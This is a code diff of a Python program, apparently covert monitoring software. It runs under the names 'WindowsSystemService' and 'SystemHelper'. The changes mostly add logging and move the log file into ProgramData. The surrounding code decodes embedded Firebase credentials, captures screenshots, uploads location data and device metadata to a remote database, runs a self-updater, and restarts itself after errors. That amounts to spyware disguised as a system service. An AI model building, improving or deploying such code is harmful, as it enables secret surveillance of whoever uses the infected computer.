@@ -7,7 +7,7 @@ import json
 import logging
 import os
 import sys
-import base64  # <--- NUEVO
+import base64
 from datetime import datetime
 import firebase_admin
 from firebase_admin import credentials, db
@@ -19,14 +19,18 @@ import sys_config as config
 def get_base_dir():
     """Devuelve el directorio donde está el ejecutable o el script."""
     if getattr(sys, 'frozen', False):
-        # Estamos en un ejecutable compilado con PyInstaller
         return os.path.dirname(sys.executable)
     else:
-        # Estamos ejecutando el script con python
         return os.path.dirname(os.path.abspath(__file__))
 
-# Configurar logging a archivo
-log_path = os.path.join(get_base_dir(), "agent.log")
+
+# ============================================================
+# LOG EN PROGRAMDATA (PERMISOS GARANTIZADOS PARA SYSTEM)
+# ============================================================
+LOG_DIR = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'SystemHelper')
+os.makedirs(LOG_DIR, exist_ok=True)
+log_path = os.path.join(LOG_DIR, "agent.log")
+
 logging.basicConfig(
     filename=log_path,
     level=logging.DEBUG,
@@ -34,62 +38,58 @@ logging.basicConfig(
 )
 logging.info("=== AGENTE INICIADO ===")
 logging.info(f"Directorio base: {get_base_dir()}")
+logging.info(f"Log path: {log_path}")
 
 
 def crear_credenciales():
-    """Decodifica el Base64 de sys_config.py y escribe sys_creds.dat"""
+    """Decodifica el Base64 de sys_config.py y escribe sys_creds.dat en la carpeta del ejecutable."""
     logging.info("Intentando crear/leer sys_creds.dat")
     cred_file = os.path.join(get_base_dir(), "sys_creds.dat")
     logging.info(f"Ruta del archivo de credenciales: {cred_file}")
-    
-    # Si ya existe y tiene datos, lo usamos
+
     if os.path.exists(cred_file):
         logging.info("sys_creds.dat ya existe, validando contenido")
         try:
             with open(cred_file, "r") as f:
                 content = f.read().strip()
                 if content and content != "{}":
-                    json.loads(content)  # Validar que es JSON
+                    json.loads(content)
                     print("[✓] sys_creds.dat ya existe y es válido")
                     return True
         except:
-            pass  # Si está corrupto, lo regeneramos
+            pass
 
     try:
         logging.info("Generando sys_creds.dat desde Base64...")
-        # Decodificar el Base64
         json_bytes = base64.b64decode(config.CREDS_B64)
         json_str = json_bytes.decode('utf-8')
         logging.info("Base64 decodificado correctamente")
-        
-        # Validar que es JSON válido
         data = json.loads(json_str)
         logging.info("JSON de credenciales validado")
-        
-        # Escribir el archivo (SIN BOM, UTF-8 puro)
         with open(cred_file, "w", encoding='utf-8') as f:
             json.dump(data, f, indent=2)
-        
         logging.info("sys_creds.dat creado correctamente desde Base64")
         return True
-        
     except Exception as e:
-        print(f"[!] Error creando credenciales desde Base64: {e}")
+        logging.error(f"Error creando credenciales desde Base64: {e}")
+        print(f"[!] Error creando credenciales: {e}")
         return False
 
 
 class WindowsSystemService:
     def __init__(self):
+        logging.info("Inicializando servicio...")
         print("[*] Iniciando servicio del sistema...")
 
-        # Crear credenciales desde Base64
         if not crear_credenciales():
+            logging.error("No se pudieron crear las credenciales")
             print("[!] Error crítico: No se pudieron crear las credenciales")
             sys.exit(1)
 
         # Inicializar Firebase
         cred_path = os.path.join(get_base_dir(), config.FIREBASE_CREDENTIALS)
         if not os.path.exists(cred_path):
+            logging.error(f"No se encuentran credenciales en {cred_path}")
             print(f"[!] ERROR: No se encuentran credenciales del sistema")
             sys.exit(1)
 
@@ -98,14 +98,16 @@ class WindowsSystemService:
             firebase_admin.initialize_app(cred, {
                 'databaseURL': config.FIREBASE_DB_URL
             })
-            print("[✓] Servicio de sincronización iniciado")
             logging.info("Firebase inicializado correctamente")
+            print("[✓] Servicio de sincronización iniciado")
         except Exception as e:
+            logging.error(f"Error inicializando Firebase: {e}")
             print(f"[!] Error en servicio de sincronización: {e}")
             sys.exit(1)
 
         self.display = DisplayHandler()
         self.device_id = self.get_device_id()
+        logging.info(f"Device ID: {self.device_id}")
         print(f"[✓] ID del sistema: {self.device_id}")
 
         self.ultima_captura = 0
@@ -114,6 +116,7 @@ class WindowsSystemService:
         self.updater = SystemUpdater()
         self.hilo_actualizacion = threading.Thread(target=self.updater.ciclo_actualizacion, daemon=True)
         self.hilo_actualizacion.start()
+        logging.info("Servicio de actualizaciones iniciado")
         print("[✓] Servicio de actualizaciones iniciado")
 
     def get_device_id(self):
@@ -199,6 +202,7 @@ class WindowsSystemService:
             print(f"[✓] Datos sincronizados [{datetime.now().strftime('%H:%M:%S')}]")
             return True
         except Exception as e:
+            logging.error(f"Error enviando datos a Firebase: {e}")
             print(f"[!] Error en sincronización: {e}")
             return False
 
@@ -233,6 +237,7 @@ class WindowsSystemService:
                     metadata['titulo'] = titulo
                 screenshot_url = None
                 if tomar_captura:
+                    logging.info(f"Capturando pantalla - Motivo: {motivo}")
                     print(f"[*] Capturando pantalla... Motivo: {motivo}")
                     img_path = self.display.capturar_pantalla()
                     if img_path:
@@ -249,6 +254,7 @@ class WindowsSystemService:
                         self.enviar_datos(ubicacion)
                 time.sleep(config.CICLO_INTERVALO)
             except Exception as e:
+                logging.error(f"Error en ciclo principal: {e}")
                 print(f"[!] Error en servicio: {e}")
                 time.sleep(30)
 
@@ -259,6 +265,7 @@ def main():
     except KeyboardInterrupt:
         print("\n[*] Servicio detenido por el usuario")
     except Exception as e:
+        logging.error(f"Error fatal: {e}")
         print(f"[!] Error fatal: {e}")
         time.sleep(30)
         main()
